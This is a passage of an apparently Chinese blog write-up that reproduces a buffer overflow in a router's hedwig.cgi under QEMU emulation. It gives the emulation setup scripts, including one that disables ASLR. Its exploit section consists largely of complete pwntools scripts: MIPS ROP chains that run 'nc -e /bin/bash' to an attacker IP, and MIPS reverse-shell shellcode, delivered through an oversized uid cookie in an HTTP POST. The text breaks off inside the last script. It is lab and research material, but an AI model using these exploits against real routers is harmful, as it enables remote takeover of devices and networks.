ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1 #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address 192.168.225.129 #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="net-sh"><a href="#net-sh" class="headerlink" title="net.sh"></a>net.sh</h3><p>物理机上运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><h3 id="init-sh"><a href="#init-sh" class="headerlink" title="init.sh"></a>init.sh</h3><p>在qemu中squashfs-root下创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><h3 id="fin-sh"><a href="#fin-sh" class="headerlink" title="fin.sh"></a>fin.sh</h3><p>qemu中squashfs-root下创建，退出时运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure><h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810194723866.png" alt="访问网站"></p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;peruy=pwner&quot;|./gdbserver.mipsle 192.168.225.154:6666 /htdocs/web/hedwig.cgi</span><br><span class="line">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure><h3 id="查找libc-和-偏移"><a href="#查找libc-和-偏移" class="headerlink" title="查找libc 和 偏移"></a>查找libc 和 偏移</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810220153748.png" alt="qemu调试"></p><h3 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810221044091.png" alt="打通"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="直接发payload"><a href="#直接发payload" class="headerlink" title="直接发payload"></a>直接发payload</h3><h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.192.128 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><h4 id="ROP-shellcode-1"><a href="#ROP-shellcode-1" class="headerlink" title="ROP+shellcode"></a>ROP+shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><h3 id="通过http报文"><a href="#通过http报文" class="headerlink" title="通过http报文"></a>通过http报文</h3><h4 id="ROP链-1"><a href="#ROP链-1" class="headerlink" title="ROP链"></a>ROP链</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.225.128 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.225.129:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h4 id="ROP链-shellcode"><a href="#ROP链-shellcode" class="headerlink" title="ROP链+shellcode"></a>ROP链+shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span 